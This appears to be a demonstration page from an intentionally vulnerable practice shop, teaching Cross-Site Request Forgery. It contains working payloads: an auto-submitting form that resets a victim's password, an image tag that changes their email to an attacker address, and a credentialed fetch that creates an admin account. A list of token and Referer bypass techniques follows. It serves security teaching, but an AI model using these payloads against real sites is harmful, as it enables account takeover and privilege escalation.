CSRF Vulnerability Testing

This page demonstrates Cross-Site Request Forgery vulnerabilities.

1. Password Change (No CSRF Protection)

Change password without CSRF token:

CSRF Attack Example:

<!-- Attacker's malicious page -->
<form id="csrf-form" method="POST" action="http://vulnshop.com/api/change-password">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.getElementById('csrf-form').submit();</script>

2. Email Update (GET Request)

Update email via GET request (vulnerable to CSRF):

CSRF via Image Tag:

<img src="http://vulnshop.com/api/update-email?email=attacker@evil.com">

3. Admin Actions (No Referer Check)

Perform admin actions without proper CSRF protection:

CSRF Attack Script:

fetch('http://vulnshop.com/api/admin/create-user', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'attacker',
    role: 'admin'
  })
});

CSRF Protection Bypass Techniques

  • Remove or modify CSRF token
  • Use same-origin policy bypasses
  • Exploit weak token validation
  • Use GET requests for state-changing operations
  • Bypass Referer header checks
  • Use subdomain takeover for same-site cookies
